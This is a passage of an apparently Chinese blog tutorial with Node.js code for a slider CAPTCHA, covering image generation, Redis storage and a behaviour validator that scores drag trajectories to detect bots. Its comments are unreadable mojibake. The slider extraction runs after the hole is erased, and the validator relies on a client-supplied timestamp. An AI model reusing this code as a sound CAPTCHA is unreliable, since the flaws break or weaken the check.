    <span class="hljs-keyword">const</span> token = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">'hex'</span>);
    
    <span class="hljs-comment">// éšæœºç”Ÿæˆæ»‘å—ç›®æ ‡ä½ç½®ï¼ˆç•™å‡ºè¾¹è·ï¼‰</span>
    <span class="hljs-keyword">const</span> targetX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (<span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span> - <span class="hljs-number">40</span>)) + <span class="hljs-number">20</span>;
    <span class="hljs-keyword">const</span> targetY = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (<span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderHeight</span> - <span class="hljs-number">40</span>)) + <span class="hljs-number">20</span>;

    <span class="hljs-comment">// ç”ŸæˆèƒŒæ™¯å›¾å’Œæ»‘å—å›¾</span>
    <span class="hljs-keyword">const</span> { bgImage, sliderImage } = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateImages</span>(targetX, targetY);

    <span class="hljs-comment">// å­˜å‚¨éªŒè¯ç æ•°æ®åˆ°Redisï¼ˆ5åˆ†é’Ÿè¿‡æœŸï¼‰</span>
    <span class="hljs-keyword">const</span> captchaData = {
      targetX,
      targetY,
      <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">attempts</span>: <span class="hljs-number">0</span>
    };
    <span class="hljs-keyword">await</span> redis.<span class="hljs-title function_">setex</span>(<span class="hljs-string">`captcha:<span class="hljs-subst">${token}</span>`</span>, <span class="hljs-number">300</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(captchaData));

    <span class="hljs-keyword">return</span> {
      token,
      <span class="hljs-attr">bgImage</span>: bgImage.<span class="hljs-title function_">toString</span>(<span class="hljs-string">'base64'</span>),
      <span class="hljs-attr">sliderImage</span>: sliderImage.<span class="hljs-title function_">toString</span>(<span class="hljs-string">'base64'</span>),
      <span class="hljs-attr">sliderWidth</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span>,
      <span class="hljs-attr">sliderHeight</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderHeight</span>
    };
  }

  <span class="hljs-comment">// ç”Ÿæˆå›¾ç‰‡</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">generateImages</span>(<span class="hljs-params">targetX, targetY</span>) {
    <span class="hljs-keyword">const</span> canvas = <span class="hljs-title function_">createCanvas</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>);
    <span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);

    <span class="hljs-comment">// ç»˜åˆ¶èƒŒæ™¯ï¼ˆéšæœºå™ªç‚¹ + å¹²æ‰°çº¿ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">drawBackground</span>(ctx);

    <span class="hljs-comment">// åˆ›å»ºæ»‘å—å½¢çŠ¶ï¼ˆåœ†å½¢ç¼ºå£ï¼‰</span>
    <span class="hljs-keyword">const</span> sliderCanvas = <span class="hljs-title function_">createCanvas</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>);
    <span class="hljs-keyword">const</span> sliderCtx = sliderCanvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);

    <span class="hljs-comment">// ç»˜åˆ¶æ»‘å—æ§½</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">drawSliderSlot</span>(ctx, targetX, targetY);

    <span class="hljs-comment">// æå–æ»‘å—åŒºåŸŸ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">extractSlider</span>(sliderCtx, ctx, targetX, targetY);

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bgImage</span>: canvas.<span class="hljs-title function_">toBuffer</span>(<span class="hljs-string">'image/png'</span>),
      <span class="hljs-attr">sliderImage</span>: sliderCanvas.<span class="hljs-title function_">toBuffer</span>(<span class="hljs-string">'image/png'</span>)
    };
  }

  <span class="hljs-title function_">drawBackground</span>(<span class="hljs-params">ctx</span>) {
    <span class="hljs-comment">// å¡«å……èƒŒæ™¯è‰²</span>
    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#f0f0f0'</span>;
    ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>);

    <span class="hljs-comment">// æ·»åŠ å™ªç‚¹</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
      ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">`rgba(<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">255</span>}</span>, <span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">255</span>}</span>, <span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">255</span>}</span>, 0.3)`</span>;
      ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>);
    }

    <span class="hljs-comment">// æ·»åŠ å¹²æ‰°çº¿</span>
    ctx.<span class="hljs-property">strokeStyle</span> = <span class="hljs-string">'rgba(100, 100, 100, 0.2)'</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
      ctx.<span class="hljs-title function_">beginPath</span>();
      ctx.<span class="hljs-title function_">moveTo</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>);
      ctx.<span class="hljs-title function_">lineTo</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>);
      ctx.<span class="hljs-title function_">stroke</span>();
    }
  }

  <span class="hljs-title function_">drawSliderSlot</span>(<span class="hljs-params">ctx, x, y</span>) {
    ctx.<span class="hljs-property">globalCompositeOperation</span> = <span class="hljs-string">'destination-out'</span>;
    ctx.<span class="hljs-title function_">beginPath</span>();
    ctx.<span class="hljs-title function_">arc</span>(x + <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span> / <span class="hljs-number">2</span>, y + <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderHeight</span> / <span class="hljs-number">2</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span> / <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-number">2</span>);
    ctx.<span class="hljs-title function_">fill</span>();
    ctx.<span class="hljs-property">globalCompositeOperation</span> = <span class="hljs-string">'source-over'</span>;

    <span class="hljs-comment">// æ·»åŠ é«˜äº®è¾¹æ¡†</span>
    ctx.<span class="hljs-property">strokeStyle</span> = <span class="hljs-string">'rgba(255, 255, 255, 0.8)'</span>;
    ctx.<span class="hljs-property">lineWidth</span> = <span class="hljs-number">2</span>;
    ctx.<span class="hljs-title function_">beginPath</span>();
    ctx.<span class="hljs-title function_">arc</span>(x + <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span> / <span class="hljs-number">2</span>, y + <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderHeight</span> / <span class="hljs-number">2</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span> / <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-number">2</span>);
    ctx.<span class="hljs-title function_">stroke</span>();
  }

  <span class="hljs-title function_">extractSlider</span>(<span class="hljs-params">sliderCtx, bgCtx, x, y</span>) {
    <span class="hljs-comment">// ä»èƒŒæ™¯ä¸­æå–æ»‘å—åŒºåŸŸ</span>
    <span class="hljs-keyword">const</span> imageData = bgCtx.<span class="hljs-title function_">getImageData</span>(x, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">sliderWidth</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span>);
    sliderCtx.<span class="hljs-title function_">putImageData</span>(imageData, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  }
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaptchaService</span>();
</code></pre>
<h4 data-id="heading-24">2. è¡Œä¸ºåˆ†æéªŒè¯å™¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/services/validator.js</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BehaviorValidator</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å„ç»´åº¦æƒé‡é…ç½®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">weights</span> = {
      <span class="hljs-attr">trajectory</span>: <span class="hljs-number">0.3</span>,    <span class="hljs-comment">// è½¨è¿¹éçº¿æ€§</span>
      <span class="hljs-attr">speed</span>: <span class="hljs-number">0.25</span>,        <span class="hljs-comment">// é€Ÿåº¦å˜åŒ–</span>
      <span class="hljs-attr">acceleration</span>: <span class="hljs-number">0.25</span>, <span class="hljs-comment">// åŠ é€Ÿåº¦æ¨¡å¼</span>
      <span class="hljs-attr">timeWindow</span>: <span class="hljs-number">0.2</span>     <span class="hljs-comment">// æ—¶é—´çª—å£</span>
    };

    <span class="hljs-comment">// é˜ˆå€¼é…ç½®</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">thresholds</span> = {
      <span class="hljs-attr">minTrajectoryPoints</span>: <span class="hljs-number">10</span>,    <span class="hljs-comment">// æœ€å°‘è½¨è¿¹ç‚¹æ•°</span>
      <span class="hljs-attr">maxLinearDeviation</span>: <span class="hljs-number">0.15</span>,   <span class="hljs-comment">// æœ€å¤§çº¿æ€§åå·®</span>
      <span class="hljs-attr">minSpeedVariance</span>: <span class="hljs-number">0.5</span>,      <span class="hljs-comment">// æœ€å°é€Ÿåº¦æ–¹å·®</span>
      <span class="hljs-attr">minCompletionTime</span>: <span class="hljs-number">200</span>,     <span class="hljs-comment">// æœ€å°å®Œæˆæ—¶é—´ï¼ˆmsï¼‰</span>
      <span class="hljs-attr">maxCompletionTime</span>: <span class="hljs-number">10000</span>    <span class="hljs-comment">// æœ€å¤§å®Œæˆæ—¶é—´ï¼ˆmsï¼‰</span>
    };
  }

  <span class="hljs-comment">// ç»¼åˆéªŒè¯</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params">trajectory, finalX, finalY, captchaData, clientTimestamp</span>) {
    <span class="hljs-keyword">const</span> results = {
      <span class="hljs-attr">position</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validatePosition</span>(finalX, finalY, captchaData),
      <span class="hljs-attr">trajectory</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateTrajectory</span>(trajectory),
      <span class="hljs-attr">speed</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateSpeed</span>(trajectory),
      <span class="hljs-attr">acceleration</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateAcceleration</span>(trajectory),
      <span class="hljs-attr">timeWindow</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateTimeWindow</span>(captchaData.<span class="hljs-property">createdAt</span>, clientTimestamp, trajectory)
    };

    <span class="hljs-comment">// è®¡ç®—ç»¼åˆå¾—åˆ†</span>
    <span class="hljs-keyword">const</span> totalScore = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">weights</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, key</span>) =&gt;</span> {
      <span class="hljs-keyword">return</span> sum + (results[key].<span class="hljs-property">score</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">weights</span>[key]);
    }, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// ä½ç½®éªŒè¯å¿…é¡»é€šè¿‡</span>
    <span class="hljs-keyword">const</span> isValid = results.<span class="hljs-property">position</span>.<span class="hljs-property">valid</span> &amp;&amp; totalScore &gt;= <span class="hljs-number">70</span>;

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">valid</span>: isValid,
      <span class="hljs-attr">score</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(totalScore),
      <span class="hljs-attr">details</span>: results
    };
  }

  <span class="hljs-comment">// ä½ç½®éªŒè¯</span>
  <span class="hljs-title function_">validatePosition</span>(<span class="hljs-params">x, y, captchaData</span>) {
    <span class="hljs-keyword">const</span> xDiff = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(x - captchaData.<span class="hljs-property">targetX</span>);
    <span class="hljs-keyword">const</span> yDiff = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(y - captchaData.<span class="hljs-property">targetY</span>);
    <span class="hljs-keyword">const</span> tolerance = <span class="hljs-number">5</span>;

    <span class="hljs-keyword">const</span> valid = xDiff &lt;= tolerance &amp;&amp; yDiff &lt;= tolerance;

    <span class="hljs-keyword">return</span> {
      valid,
      <span class="hljs-attr">score</span>: valid ? <span class="hljs-number">100</span> : <span class="hljs-number">0</span>,
      <span class="hljs-attr">details</span>: { xDiff, yDiff, <span class="hljs-attr">targetX</span>: captchaData.<span class="hljs-property">targetX</span>, <span class="hljs-attr">targetY</span>: captchaData.<span class="hljs-property">targetY</span> }
    };
  }

  <span class="hljs-comment">// è½¨è¿¹éªŒè¯</span>
  <span class="hljs-title function_">validateTrajectory</span>(<span class="hljs-params">trajectory</span>) {
    <span class="hljs-keyword">if</span> (trajectory.<span class="hljs-property">length</span> &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">thresholds</span>.<span class="hljs-property">minTrajectoryPoints</span>) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">reason</span>: <span class="hljs-string">`Too few trajectory points: <span class="hljs-subst">${trajectory.length}</span>`</span>
      };
    }

    <span class="hljs-comment">// è®¡ç®—è½¨è¿¹éçº¿æ€§åº¦</span>
    <span class="hljs-keyword">const</span> deviations = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">2</span>; i &lt; trajectory.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> p1 = trajectory[i - <span class="hljs-number">2</span>];
      <span class="hljs-keyword">const</span> p2 = trajectory[i - <span class="hljs-number">1</span>];
      <span class="hljs-keyword">const</span> p3 = trajectory[i];

      <span class="hljs-keyword">const</span> angle1 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">atan2</span>(p2.<span class="hljs-property">y</span> - p1.<span class="hljs-property">y</span>, p2.<span class="hljs-property">x</span> - p1.<span class="hljs-property">x</span>);
      <span class="hljs-keyword">const</span> angle2 = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">atan2</span>(p3.<span class="hljs-property">y</span> - p2.<span class="hljs-property">y</span>, p3.<span class="hljs-property">x</span> - p2.<span class="hljs-property">x</span>);
      <span class="hljs-keyword">const</span> deviation = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(angle2 - angle1);
      deviations.<span class="hljs-title function_">push</span>(deviation);
    }

    <span class="hljs-keyword">const</span> avgDeviation = deviations.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / deviations.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> isLinear = avgDeviation &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">thresholds</span>.<span class="hljs-property">maxLinearDeviation</span>;

    <span class="hljs-comment">// éçº¿æ€§åº¦è¶Šé«˜ï¼Œå¾—åˆ†è¶Šé«˜ï¼ˆäººç±»ç‰¹å¾ï¼‰</span>
    <span class="hljs-keyword">const</span> score = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">100</span>, avgDeviation * <span class="hljs-number">200</span>);

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">valid</span>: !isLinear,
      score,
      <span class="hljs-attr">details</span>: { avgDeviation, <span class="hljs-attr">pointCount</span>: trajectory.<span class="hljs-property">length</span>, isLinear }
    };
  }

  <span class="hljs-comment">// é€Ÿåº¦éªŒè¯</span>
  <span class="hljs-title function_">validateSpeed</span>(<span class="hljs-params">trajectory</span>) {
    <span class="hljs-keyword">const</span> speeds = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; trajectory.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> prev = trajectory[i - <span class="hljs-number">1</span>];
      <span class="hljs-keyword">const</span> curr = trajectory[i];
      <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
        <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">x</span> - prev.<span class="hljs-property">x</span>, <span class="hljs-number">2</span>) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">y</span> - prev.<span class="hljs-property">y</span>, <span class="hljs-number">2</span>)
      );
      <span class="hljs-keyword">const</span> timeDiff = curr.<span class="hljs-property">t</span> - prev.<span class="hljs-property">t</span>;
      <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">0</span>) {
        speeds.<span class="hljs-title function_">push</span>(distance / timeDiff);
      }
    }

    <span class="hljs-keyword">if</span> (speeds.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'No speed data'</span> };
    }

    <span class="hljs-keyword">const</span> avgSpeed = speeds.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / speeds.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> variance = speeds.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, speed</span>) =&gt;</span> {
      <span class="hljs-keyword">return</span> sum + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(speed - avgSpeed, <span class="hljs-number">2</span>);
    }, <span class="hljs-number">0</span>) / speeds.<span class="hljs-property">length</span>;

    <span class="hljs-keyword">const</span> isConstantSpeed = variance &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">thresholds</span>.<span class="hljs-property">minSpeedVariance</span>;

    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰åŠ é€Ÿ-å‡é€Ÿè¿‡ç¨‹</span>
    <span class="hljs-keyword">let</span> hasAccelDecel = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">if</span> (speeds.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) {
      <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(speeds.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>);
      <span class="hljs-keyword">const</span> firstHalf = speeds.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, mid);
      <span class="hljs-keyword">const</span> secondHalf = speeds.<span class="hljs-title function_">slice</span>(mid);
      <span class="hljs-keyword">const</span> avgFirst = firstHalf.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / firstHalf.<span class="hljs-property">length</span>;
      <span class="hljs-keyword">const</span> avgSecond = secondHalf.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / secondHalf.<span class="hljs-property">length</span>;
      hasAccelDecel = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(avgFirst - avgSecond) &gt; avgSpeed * <span class="hljs-number">0.2</span>;
    }

    <span class="hljs-keyword">const</span> score = (!isConstantSpeed &amp;&amp; hasAccelDecel) ? <span class="hljs-number">100</span> : 
                  (!isConstantSpeed || hasAccelDecel) ? <span class="hljs-number">70</span> : <span class="hljs-number">30</span>;

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">valid</span>: !isConstantSpeed,
      score,
      <span class="hljs-attr">details</span>: { variance, hasAccelDecel, avgSpeed, isConstantSpeed }
    };
  }

  <span class="hljs-comment">// åŠ é€Ÿåº¦éªŒè¯</span>
  <span class="hljs-title function_">validateAcceleration</span>(<span class="hljs-params">trajectory</span>) {
    <span class="hljs-keyword">const</span> speeds = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; trajectory.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> prev = trajectory[i - <span class="hljs-number">1</span>];
      <span class="hljs-keyword">const</span> curr = trajectory[i];
      <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
        <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">x</span> - prev.<span class="hljs-property">x</span>, <span class="hljs-number">2</span>) + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(curr.<span class="hljs-property">y</span> - prev.<span class="hljs-property">y</span>, <span class="hljs-number">2</span>)
      );
      <span class="hljs-keyword">const</span> timeDiff = curr.<span class="hljs-property">t</span> - prev.<span class="hljs-property">t</span>;
      <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">0</span>) {
        speeds.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">speed</span>: distance / timeDiff, <span class="hljs-attr">time</span>: curr.<span class="hljs-property">t</span> });
      }
    }

    <span class="hljs-keyword">if</span> (speeds.<span class="hljs-property">length</span> &lt; <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Insufficient data'</span> };
    }

    <span class="hljs-keyword">const</span> accelerations = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; speeds.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">const</span> speedDiff = speeds[i].<span class="hljs-property">speed</span> - speeds[i - <span class="hljs-number">1</span>].<span class="hljs-property">speed</span>;
      <span class="hljs-keyword">const</span> timeDiff = speeds[i].<span class="hljs-property">time</span> - speeds[i - <span class="hljs-number">1</span>].<span class="hljs-property">time</span>;
      <span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">0</span>) {
        accelerations.<span class="hljs-title function_">push</span>(speedDiff / timeDiff);
      }
    }

    <span class="hljs-keyword">if</span> (accelerations.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'No acceleration data'</span> };
    }

    <span class="hljs-comment">// åˆ†æåŠ é€Ÿåº¦æ¨¡å¼</span>
    <span class="hljs-keyword">const</span> total = accelerations.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> firstThird = accelerations.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(total / <span class="hljs-number">3</span>));
    <span class="hljs-keyword">const</span> lastThird = accelerations.<span class="hljs-title function_">slice</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(total * <span class="hljs-number">2</span> / <span class="hljs-number">3</span>));

    <span class="hljs-keyword">const</span> avgFirst = firstThird.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / firstThird.<span class="hljs-property">length</span> || <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> avgLast = lastThird.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>) / lastThird.<span class="hljs-property">length</span> || <span class="hljs-number">0</span>;

    <span class="hljs-comment">// æ­£å¸¸æ¨¡å¼ï¼šå‰åŠæ®µåŠ é€Ÿï¼ˆæ­£åŠ é€Ÿåº¦ï¼‰ï¼ŒååŠæ®µå‡é€Ÿï¼ˆè´ŸåŠ é€Ÿåº¦ï¼‰</span>
    <span class="hljs-keyword">const</span> hasNaturalPattern = avgFirst &gt; <span class="hljs-number">0.03</span> &amp;&amp; avgLast &lt; -<span class="hljs-number">0.03</span>;

    <span class="hljs-keyword">const</span> score = hasNaturalPattern ? <span class="hljs-number">100</span> : 
                  (avgFirst &gt; <span class="hljs-number">0</span> || avgLast &lt; <span class="hljs-number">0</span>) ? <span class="hljs-number">60</span> : <span class="hljs-number">20</span>;

    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">valid</span>: hasNaturalPattern,
      score,
      <span class="hljs-attr">details</span>: { avgFirst, avgLast, hasNaturalPattern }
    };
  }

  <span class="hljs-comment">// æ—¶é—´çª—å£éªŒè¯</span>
  <span class="hljs-title function_">validateTimeWindow</span>(<span class="hljs-params">createdAt, clientTimestamp, trajectory</span>) {
    <span class="hljs-keyword">const</span> serverTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    
    <span class="hljs-comment">// æ£€æŸ¥Redisä¸­çš„tokenæ˜¯å¦åœ¨æœ‰æ•ˆæœŸ</span>
    <span class="hljs-keyword">if</span> (serverTime - createdAt &gt; <span class="hljs-number">5</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Token expired'</span> };
    }

    <span class="hljs-comment">// æ£€æŸ¥å®¢æˆ·ç«¯å£°ç§°çš„å®Œæˆæ—¶é—´</span>
    <span class="hljs-keyword">const</span> claimedDuration = clientTimestamp - createdAt;
    <span class="hljs-keyword">if</span> (claimedDuration &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">thresholds</span>.<span class="hljs-property">minCompletionTime</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Suspiciously fast'</span> };
    }
    <span class="hljs-keyword">if</span> (claimedDuration &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">thresholds</span>.<span class="hljs-property">maxCompletionTime</span>) {
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">score</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">reason</span>: <span class="hljs-string">'Suspiciously slow'</span> };
    }

    <span class="hljs-comment">// éªŒè¯è½¨è¿¹æ—¶é—´å’Œå£°ç§°æ—¶é—´æ˜¯å¦ä¸€è‡´ï¼ˆé˜²ç¯¡æ”¹ï¼‰</span>
    <span class="hljs-keyword">if</span> (trajectory.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">const</span> trajectoryDuration = trajectory[trajectory.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">t</span>;
      <span class="hljs-keyword">const</span> timeDiff = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(trajectoryDuration - claimedDuration);
